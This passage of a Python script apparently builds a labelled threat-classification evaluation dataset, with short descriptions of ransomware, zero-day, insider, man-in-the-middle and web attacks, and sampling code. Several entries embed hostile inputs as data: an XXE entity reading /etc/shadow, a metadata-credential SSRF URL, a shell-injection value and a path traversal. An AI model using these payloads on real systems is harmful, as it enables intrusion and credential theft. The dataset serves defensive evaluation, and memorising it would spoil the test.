    },

    # ── Ransomware (17 more → total 22) ──────────────────────────
    {
        "id": 116,
        "threat_description": (
            "BlackCat (ALPHV) ransomware deployed via compromised MSP remote management "
            "tool. RaaS affiliate used Rust-compiled encryptor, encrypted 300 VMs in "
            "VMware ESXi environment in 7 minutes using VMware's esxcli command."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 117,
        "threat_description": (
            "LockBit 3.0 (LockBit Black) attack: initial access via unpatched "
            "Citrix Bleed (CVE-2023-4966). Lateral movement via pass-the-hash. "
            "Shadow copies deleted with vssadmin before encryption of 8 TB of data."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 118,
        "threat_description": (
            "Ransomware-as-a-Service attack: affiliate purchases initial access from "
            "an initial access broker (IAB) on dark web for $3,500. Deploys Hive "
            "ransomware manually after 3-day dwell time in network."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 119,
        "threat_description": (
            "Ransomware targeting ESXi hypervisors (ESXiArgs): automated script exploits "
            "CVE-2021-21985 on exposed VMware ESXi, encrypts all VMDK files, and leaves "
            "ransom note. 3,800 global servers affected within 72 hours."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 120,
        "threat_description": (
            "Triple extortion: attacker encrypts data, threatens to publish it, AND "
            "launches DDoS against the victim's public-facing infrastructure simultaneously "
            "to add pressure. Ransom demand: $4M in Monero."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 121,
        "threat_description": (
            "Cl0p ransomware via MOVEit Transfer zero-day (CVE-2023-34362): "
            "SQL injection in internet-facing MOVEit file transfer server used to "
            "exfiltrate data from 2,500+ organisations before encryption."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 122,
        "threat_description": (
            "Ransomware targeting backup infrastructure first: attacker identified and "
            "encrypted Veeam backup server and all backup repositories before targeting "
            "production systems, eliminating recovery options."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 123,
        "threat_description": (
            "Maze ransomware group publishes 10 GB of sample data on their 'leak site' "
            "to pressure victim into paying. Data includes HR records and board minutes. "
            "Victim refuses to pay; full 400 GB released publicly."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 124,
        "threat_description": (
            "Ransomware propagated via GPO: attacker with domain admin privileges creates "
            "a GPO pushing a malicious startup script to all 2,000 domain-joined machines. "
            "Encryption begins simultaneously at 2 AM."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 125,
        "threat_description": (
            "Manufacturing plant hit by Industroyer2/CRASHOVERRIDE variant: OT network "
            "isolated from IT, but ransomware previously pivoted via historian server. "
            "Production halted for 11 days; estimated $90M in losses."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 126,
        "threat_description": (
            "Ransomware without encryption: attacker exfiltrates 500 GB of data and "
            "threatens to release it unless paid, but does not encrypt systems. "
            "Known as 'extortionware' or 'pure extortion' attack (BianLian group)."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 127,
        "threat_description": (
            "Ransomware using BYOVD (Bring Your Own Vulnerable Driver): attacker loads "
            "gdrv.sys (vulnerable GIGABYTE driver) to terminate EDR processes as SYSTEM "
            "before deploying ransomware payload undetected."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 128,
        "threat_description": (
            "Scattered Spider attack on casino chain: attacker socially engineered "
            "IT helpdesk into resetting MFA for an executive, accessed Azure AD, "
            "exfiltrated customer PII, then deployed DragonForce ransomware."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 129,
        "threat_description": (
            "Ransomware in cloud storage: attacker with compromised AWS credentials "
            "uses S3 SSE-C (customer-provided encryption keys) to re-encrypt all "
            "S3 objects, then deletes the unencrypted originals. Demands ransom for key."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 130,
        "threat_description": (
            "Akira ransomware exploiting Cisco ASA VPN (CVE-2023-20269): "
            "brute-forces VPN accounts with no MFA, establishes foothold, "
            "achieves domain admin within 5 hours via Kerberoasting."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 131,
        "threat_description": (
            "Ransomware with time-based pricing: ransom note states that cost doubles "
            "every 48 hours (starting at $200K, capping at $3.2M). "
            "Creates artificial urgency to prevent thorough incident response."
        ),
        "true_label": "Ransomware"
    },
    {
        "id": 132,
        "threat_description": (
            "Royal (BlackSuit) ransomware via malvertising: drive-by download from a "
            "Google Ads-served malicious installer for a fake VLC player update. "
            "BATLOADER stages Cobalt Strike, then ransomware deployed 72 hours later."
        ),
        "true_label": "Ransomware"
    },

    # ── Zero-Day Exploit (17 more → total 22) ────────────────────
    {
        "id": 133,
        "threat_description": (
            "Ivanti Connect Secure (CVE-2025-0282): stack-based buffer overflow "
            "in SSL-VPN web component allows unauthenticated remote code execution. "
            "Exploited in the wild against Nominet (.uk registry) before patch availability."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 134,
        "threat_description": (
            "SharePoint ToolShell chain (CVE-2025-53770 + CVE-2025-53771): "
            "chained vulnerabilities in internet-facing SharePoint allow unauthenticated "
            "RCE. 396 servers confirmed compromised in first 72 hours of exploitation."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 135,
        "threat_description": (
            "Chrome V8 type confusion (CVE-2024-4947): crafted JavaScript triggers "
            "out-of-bounds memory access in the JIT compiler. Weaponized as a "
            "one-click exploit delivered via malicious ad network. Patch available 5 days later."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 136,
        "threat_description": (
            "Citrix Bleed (CVE-2023-4966): sensitive session token leakage from Citrix "
            "NetScaler ADC/Gateway allows session hijacking without credentials or MFA. "
            "Exploited by LockBit affiliates against 300+ organisations."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 137,
        "threat_description": (
            "PaperCut NG/MF unauthenticated RCE (CVE-2023-27350): zero-day in print "
            "management software allows unauthenticated attackers to execute arbitrary "
            "code as SYSTEM. Used by Cl0p and LockBit in ransomware campaigns."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 138,
        "threat_description": (
            "WinRAR code execution (CVE-2023-38831): crafted ZIP archive with spoofed "
            "extension causes WinRAR to execute a hidden script when user opens a "
            "seemingly benign file. Exploited by APT28 and APT40 against financial targets."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 139,
        "threat_description": (
            "Cisco IOS XE web UI zero-day (CVE-2023-20198): unauthenticated privilege "
            "escalation in HTTP server allows attacker to create admin account. "
            "Over 50,000 Cisco devices backdoored within 48 hours of public PoC."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 140,
        "threat_description": (
            "Kernel privilege escalation via io_uring (CVE-2024-0582): use-after-free "
            "in Linux kernel io_uring subsystem allows local attacker to gain root. "
            "Exploited in containerized environments to escape Docker sandbox."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 141,
        "threat_description": (
            "GoAnywhere MFT zero-day (CVE-2023-0669): pre-authentication RCE via unsafe "
            "Java deserialization in the admin console. Cl0p ransomware group exploited "
            "this to exfiltrate data from 130+ organisations in 10 days."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 142,
        "threat_description": (
            "Apple WebKit zero-day (CVE-2023-37450): out-of-bounds read via crafted "
            "web content achieves remote code execution on iOS/macOS/Safari. "
            "Exploited in targeted attacks before Apple's emergency Rapid Security Response."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 143,
        "threat_description": (
            "Barracuda ESG zero-day (CVE-2023-2868): improper input validation in "
            "email attachment processing allows unauthenticated RCE. Attackers "
            "maintained persistent access for 8 months before detection."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 144,
        "threat_description": (
            "MOVEit Transfer SQL injection (CVE-2023-34362): unauthenticated SQLi in "
            "the HTTPS handler allows privilege escalation and data exfiltration. "
            "Exploited in a coordinated zero-day campaign affecting 2,500+ organisations."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 145,
        "threat_description": (
            "Confluence Data Center/Server OGNL injection (CVE-2023-22515): "
            "unauthenticated attacker creates administrator account via broken access "
            "control. Exploited within hours of public disclosure by multiple threat actors."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 146,
        "threat_description": (
            "F5 BIG-IP Configuration utility RCE (CVE-2023-46747): request smuggling "
            "vulnerability allows unauthenticated command injection. 133 organisations "
            "confirmed compromised; attackers create TMUI root backdoors."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 147,
        "threat_description": (
            "JetBrains TeamCity authentication bypass (CVE-2024-27198): unauthenticated "
            "REST API endpoint allows arbitrary code execution. North Korean APT groups "
            "exploit this for supply chain access to software development pipelines."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 148,
        "threat_description": (
            "Palo Alto Networks PAN-OS GlobalProtect zero-day (CVE-2024-3400): command "
            "injection in the GlobalProtect gateway via crafted SESSID cookie. "
            "Exploited by UTA0218 to deploy Python backdoor 'UPSTYLE' on 22,500 devices."
        ),
        "true_label": "Zero-Day Exploit"
    },
    {
        "id": 149,
        "threat_description": (
            "Microsoft Outlook zero-click RCE (CVE-2024-21413): crafted email exploits "
            "hyperlink handling to leak NTLM hashes and execute code without user opening "
            "the email. Exploited by Forest Blizzard (APT28) in targeted campaigns."
        ),
        "true_label": "Zero-Day Exploit"
    },

    # ── Insider Threat (18 more → total 22) ──────────────────────
    {
        "id": 150,
        "threat_description": (
            "Software engineer downloads full production database backup to personal "
            "laptop via VPN 2 days before accepting a competitor's offer. "
            "DLP alert fired on 18 GB transfer but was not reviewed for 3 weeks."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 151,
        "threat_description": (
            "System administrator with privileged access modifies audit logging "
            "configuration to exclude their own actions, then accesses 10,000 customer "
            "financial records undetected for 4 months."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 152,
        "threat_description": (
            "Terminated employee's service account not disabled for 7 days after offboarding. "
            "Former employee remotely accesses CRM, exports all 50,000 customer records, "
            "and shares them with a new employer (direct competitor)."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 153,
        "threat_description": (
            "Sales employee copies prospecting database to personal Google Drive via "
            "browser sync, then leaves to start a competing firm. "
            "CASB logs capture the upload; legal proceedings initiated."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 154,
        "threat_description": (
            "Coinbase insider threat: overseas customer support contractors paid to "
            "exfiltrate customer PII including names, addresses, government IDs, and "
            "partial bank account information. Affects <1% of users but enables targeted fraud."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 155,
        "threat_description": (
            "Rogue DevOps engineer plants a time-bomb in CI/CD pipeline: script runs "
            "three months after departure, deleting all production Kubernetes namespaces "
            "and Terraform state files."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 156,
        "threat_description": (
            "Pharmaceutical researcher bulk-exfiltrates proprietary drug compound data "
            "to personal OneDrive before transition to competitor. Exfiltration conducted "
            "in 200 MB batches over 3 weeks to stay under DLP size thresholds."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 157,
        "threat_description": (
            "Customer support agent performs 'shoulder surfing' with their phone camera "
            "to capture customer PII displayed on screen, then sells data to identity "
            "theft ring via dark web forum."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 158,
        "threat_description": (
            "Privileged user abuses just-in-time (JIT) access: employee requests "
            "emergency access to production database for an incident, copies sensitive "
            "records, and revokes their own access before the 1-hour window closes."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 159,
        "threat_description": (
            "Third-party auditor granted read access to financial systems exfiltrates "
            "pre-announcement earnings data. Shared with hedge fund contacts resulting "
            "in SEC insider trading investigation."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 160,
        "threat_description": (
            "Security analyst repurposes internal threat intelligence tools to mine "
            "competitors' network infrastructure information, builds a commercial "
            "threat intel product using company-owned tooling and data."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 161,
        "threat_description": (
            "Cloud engineer creates an AWS IAM backdoor user 'svc-monitor' with "
            "AdministratorAccess policy before being let go, retaining persistent "
            "privileged access for 5 months post-departure."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 162,
        "threat_description": (
            "Disgruntled network engineer reconfigures ACLs on core switches to allow "
            "external access to internal management VLAN, creating a backdoor for a "
            "criminal contact. Backdoor exploited 10 days later."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 163,
        "threat_description": (
            "Nurse accesses patient records of a celebrity patient 47 times without "
            "clinical justification. Sells information to tabloid media. "
            "Detected via UEBA anomaly score spike on access frequency."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 164,
        "threat_description": (
            "IT admin installs unlicensed keylogger on executive laptops under guise "
            "of a routine software audit, capturing email passwords and board-level "
            "confidential communications for 6 months."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 165,
        "threat_description": (
            "Developer embeds a cryptocurrency mining module in a microservice, "
            "using a small fraction of cloud CPU per instance. Across a 1,000-instance "
            "fleet, generates meaningful mining revenue while staying under alert thresholds."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 166,
        "threat_description": (
            "Payroll administrator modifies ghost employee records to redirect wages "
            "to personal accounts. Fraud detected via audit of payroll delta report "
            "showing 12 employees with no HR records in the employee management system."
        ),
        "true_label": "Insider Threat"
    },
    {
        "id": 167,
        "threat_description": (
            "Nation-state recruited insider: defence contractor employee recruited by "
            "foreign intelligence agency to exfiltrate classified system architecture "
            "documents over 18 months using encrypted dead drop on Tor."
        ),
        "true_label": "Insider Threat"
    },

    # ── Man-in-the-Middle (18 more → total 22) ───────────────────
    {
        "id": 168,
        "threat_description": (
            "HTTPS downgrade attack: attacker on shared hotel Wi-Fi uses sslstrip "
            "to intercept connections, stripping HTTPS redirects for sites without HSTS. "
            "Banking session credentials captured in plaintext."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 169,
        "threat_description": (
            "Evil twin AP with the same SSID as a corporate office Wi-Fi. "
            "Clients auto-connect with stronger signal. Attacker intercepts "
            "Active Directory LDAP authentication capturing NTLMv2 hashes."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 170,
        "threat_description": (
            "DNS cache poisoning (Kaminsky-style): forged DNS responses poison recursive "
            "resolver cache, redirecting all users of a large ISP to a phishing page for "
            "a major bank for 4 hours before detection."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 171,
        "threat_description": (
            "ICMP redirect attack: attacker sends spoofed ICMP Type 5 redirect messages "
            "to hosts, changing their default gateway to attacker-controlled IP. "
            "All outbound traffic silently forwarded through attacker system."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 172,
        "threat_description": (
            "TLS certificate pinning bypass using mitmproxy: MDM pushes a corporate CA "
            "certificate to mobile devices for monitoring. Attacker installs rogue MDM "
            "profile on BYOD device to intercept TLS traffic."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 173,
        "threat_description": (
            "LLMNR/NBT-NS poisoning on internal network: Responder tool intercepts "
            "name resolution broadcasts and captures NTLMv2 challenge-response hashes. "
            "Three admin hashes cracked offline in under 30 minutes."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 174,
        "threat_description": (
            "Adversary-in-the-middle via compromised home router: attacker exploits "
            "UPnP vulnerability in consumer router firmware to establish NAT redirect "
            "rules, intercepting traffic from WFH employee's corporate VPN split-tunnel."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 175,
        "threat_description": (
            "Subdomain takeover enabling MITM: expired CloudFront distribution "
            "for 'api.legacy.company.com' claimed by attacker. Service workers cached "
            "by browsers allow interception of API tokens from subsequent requests."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 176,
        "threat_description": (
            "BGP route injection by compromised ISP: malicious BGP UPDATE propagates "
            "a more specific prefix for a payment processor's IP range, redirecting "
            "transaction traffic through a foreign AS for TLS interception."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 177,
        "threat_description": (
            "HTTP request smuggling (CL.TE): conflicting Content-Length and "
            "Transfer-Encoding headers trick front-end/back-end proxy pair into "
            "misaligning request boundaries, allowing attacker to poison request queue."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 178,
        "threat_description": (
            "Bluetooth MITM (BIAS attack): attacker exploits CVE-2020-10135 in "
            "Bluetooth Classic to impersonate a previously paired device without "
            "knowing the link key, intercepting keyboard/HID communications."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 179,
        "threat_description": (
            "OAuth token interception: attacker MITMs a mobile app's token refresh flow "
            "using a malicious proxy CA certificate. Access tokens captured allow "
            "full access to user's cloud storage without re-authentication."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 180,
        "threat_description": (
            "Quantum insert attack: nation-state actor exploits timing window in TCP "
            "stream to inject a malicious HTTP response before legitimate server responds. "
            "Used to deliver browser exploit to targeted activists."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 181,
        "threat_description": (
            "MQTT broker MITM in industrial IoT: attacker intercepts unencrypted MQTT "
            "traffic between factory sensors and SCADA system, injecting false sensor "
            "readings that trigger incorrect automated safety shutdowns."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 182,
        "threat_description": (
            "WebSocket MITM: proxy deployed between client and WebSocket server "
            "intercepts JSON messages in a trading application. "
            "Attacker modifies bid prices before forwarding, gaining market advantage."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 183,
        "threat_description": (
            "Certificate transparency log reveals attacker obtained a valid DV cert "
            "for 'login.bank.example.com' via domain validation of a lookalike domain. "
            "Used in combination with BGP hijack for convincing MITM."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 184,
        "threat_description": (
            "Relay attack on NFC payment: researcher uses two Android phones to relay "
            "NFC signals between a victim's contactless card and a POS terminal at "
            "distance, conducting unauthorised transactions."
        ),
        "true_label": "Man-in-the-Middle"
    },
    {
        "id": 185,
        "threat_description": (
            "Attacker compromises an intermediate CA certificate from a breached "
            "certificate authority, issues fraudulent TLS certs for major financial "
            "institutions, and uses them in targeted MITM attacks."
        ),
        "true_label": "Man-in-the-Middle"
    },

    # ── Other (19 more → total 22) ────────────────────────────────
    {
        "id": 186,
        "threat_description": (
            "Cross-site scripting (XSS) in customer portal: stored XSS in support "
            "ticket subject field executes JavaScript in admin console. "
            "Attacker exfiltrates admin session cookie and hijacks privileged session."
        ),
        "true_label": "Other"
    },
    {
        "id": 187,
        "threat_description": (
            "Server-Side Request Forgery (SSRF) via image URL processor: attacker "
            "submits http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
            "as image URL, retrieving AWS IAM role credentials from EC2 metadata service."
        ),
        "true_label": "Other"
    },
    {
        "id": 188,
        "threat_description": (
            "Broken access control (IDOR): user changes order ID in URL from /orders/1234 "
            "to /orders/1235 and views another customer's order details including shipping "
            "address and payment method last 4 digits."
        ),
        "true_label": "Other"
    },
    {
        "id": 189,
        "threat_description": (
            "XML External Entity (XXE) injection: SOAP endpoint processes XML with "
            "DOCTYPE declaration referencing external entity '<!ENTITY xxe SYSTEM "
            "\"file:///etc/shadow\">'. Server returns /etc/shadow contents in response."
        ),
        "true_label": "Other"
    },
    {
        "id": 190,
        "threat_description": (
            "Container escape via privileged mode: Docker container running with "
            "--privileged flag mounts host filesystem at /host. Attacker writes "
            "cron job to /host/etc/cron.d/, achieving host-level code execution."
        ),
        "true_label": "Other"
    },
    {
        "id": 191,
        "threat_description": (
            "Credential stuffing attack: 100,000 username/password pairs from a leaked "
            "breach database tested against /login endpoint using distributed botnet. "
            "3,200 accounts successfully compromised (3.2% success rate)."
        ),
        "true_label": "Other"
    },
    {
        "id": 192,
        "threat_description": (
            "Business logic flaw: e-commerce platform allows applying multiple discount "
            "codes in sequence, each calculated on the post-discount price. "
            "Attacker chains 10 codes to reduce $500 item price to $0.03."
        ),
        "true_label": "Other"
    },
    {
        "id": 193,
        "threat_description": (
            "Deserialization vulnerability in Java API: crafted serialized object sent "
            "to /api/v1/import triggers RCE via Apache Commons Collections gadget chain "
            "(ysoserial CommonsCollections1). Full OS command execution achieved."
        ),
        "true_label": "Other"
    },
    {
        "id": 194,
        "threat_description": (
            "Command injection in network device web interface: router admin panel "
            "ping tool passes user input unsanitised to system(): "
            "127.0.0.1; cat /etc/passwd achieves OS command execution."
        ),
        "true_label": "Other"
    },
    {
        "id": 195,
        "threat_description": (
            "Insecure direct object reference in API: JWT token's 'role' claim not "
            "verified server-side. Attacker modifies JWT payload (algorithm:none attack) "
            "to set role='admin' and access all administrative endpoints."
        ),
        "true_label": "Other"
    },
    {
        "id": 196,
        "threat_description": (
            "Path traversal in document management system: GET /download?file=../../etc/passwd "
            "retrieves arbitrary files from server filesystem. 500,000 sensitive HR documents "
            "accessible to any authenticated user."
        ),
        "true_label": "Other"
    },
    {
        "id": 197,
        "threat_description": (
            "SIM swapping attack: attacker socially engineers mobile carrier to transfer "
            "victim's phone number to attacker SIM. Bypasses SMS-based MFA on bank accounts. "
            "$750,000 drained from investment accounts within 2 hours."
        ),
        "true_label": "Other"
    },
    {
        "id": 198,
        "threat_description": (
            "Kubernetes RBAC misconfiguration: service account bound to ClusterRole with "
            "wildcard permissions (*). Pod compromise allows listing all secrets in all "
            "namespaces, including credentials for production databases."
        ),
        "true_label": "Other"
    },
    {
        "id": 199,
        "threat_description": (
            "Git secrets exposure: developer commits .env file containing production AWS "
            "keys and database passwords to public GitHub repo. Repository scraped by "
            "automated bots within 4 minutes; AWS resources compromised."
        ),
        "true_label": "Other"
    },
    {
        "id": 200,
        "threat_description": (
            "Cross-Site Request Forgery (CSRF) in banking app: malicious webpage "
            "submits a hidden form to https://bank.com/transfer with attacker's account "
            "details. Missing CSRF token results in unauthorised fund transfer."
        ),
        "true_label": "Other"
    },
    {
        "id": 201,
        "threat_description": (
            "Open redirect abuse: /login?next=https://attacker.com used in phishing "
            "emails. Legitimate bank domain in URL increases trust; user is silently "
            "redirected after login to credential harvesting page."
        ),
        "true_label": "Other"
    },
    {
        "id": 202,
        "threat_description": (
            "Subdomain takeover: 'beta.company.com' CNAME points to a Heroku app that "
            "has been deleted. Attacker claims the Heroku subdomain, serves malicious "
            "content from what appears to be a legitimate company subdomain."
        ),
        "true_label": "Other"
    },
    {
        "id": 203,
        "threat_description": (
            "Mass assignment vulnerability in REST API: PATCH /users/:id accepts "
            "arbitrary JSON fields. Attacker includes 'isAdmin:true' in profile update "
            "request, elevating own account to administrator role."
        ),
        "true_label": "Other"
    },
    {
        "id": 204,
        "threat_description": (
            "Terraform state file exposed in public S3 bucket: state file contains "
            "plaintext RDS master passwords, Kubernetes secrets, and TLS private keys "
            "for all production infrastructure. Discovered via automated scanner."
        ),
        "true_label": "Other"
    },
]


# ─────────────────────────────────────────────────────────────────
#  Category summary helper
# ─────────────────────────────────────────────────────────────────

def print_summary(dataset) -> None:
    from collections import Counter
    counts = Counter(item["true_label"] for item in dataset)
    print("\n  Category distribution:")
    for label, count in sorted(counts.items()):
        bar = "#" * count
        print(f"    {label:<25s} {bar}  ({count})")
    print(f"\n  Total records: {len(dataset)}\n")


# ─────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Build the CyberCouncil evaluation dataset."
    )
    parser.add_argument(
        "--out", "-o",
        default="data/threats.json",
        help="Output path for the dataset JSON (default: data/threats.json)"
    )
    parser.add_argument(
        "--pretty", action="store_true", default=True,
        help="Write indented JSON (default: True)"
    )
    args = parser.parse_args()


    # Optionally limit number of samples via .env (MAX_SAMPLES)
    from dotenv import load_dotenv
    load_dotenv()

    import random
    random.seed(42)   # fixed seed — ensures reproducible dataset order for paper
    max_samples = os.getenv("MAX_SAMPLES")
    if max_samples is not None:
        try:
            max_samples = int(max_samples)
            # Group by category
            from collections import defaultdict
            by_cat = defaultdict(list)
            for item in DATASET:
                by_cat[item["true_label"]].append(item)
            # Calculate per-category sample count (as even as possible)
            categories = list(by_cat.keys())
            n_cats = len(categories)
            base = max_samples // n_cats
            extra = max_samples % n_cats
            dataset_out = []
            for i, cat in enumerate(categories):
                n = base + (1 if i < extra else 0)
                cat_items = by_cat[cat]
                if len(cat_items) <= n:
                    dataset_out.extend(cat_items)
                else:
                    dataset_out.extend(random.sample(cat_items, n))
            random.shuffle(dataset_out)
        except Exception as e:
            print(f"Warning: Invalid MAX_SAMPLES value or sampling error: {e}, using all samples.")
            dataset_out = DATASET
    else:
        dataset_out = DATASET

    print(f"\n  CyberCouncil Dataset Builder")
    print(f"  -----------------------------")
    print_summary(dataset_out)

    indent = 2 if args.pretty else None
    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(dataset_out, f, indent=indent)

    print(f"  Written {len(dataset_out)} records to: {args.out}")
    print(f"  Use with: python run_eval.py  (update DATASET_PATH if needed)\n")


if __name__ == "__main__":
    main()
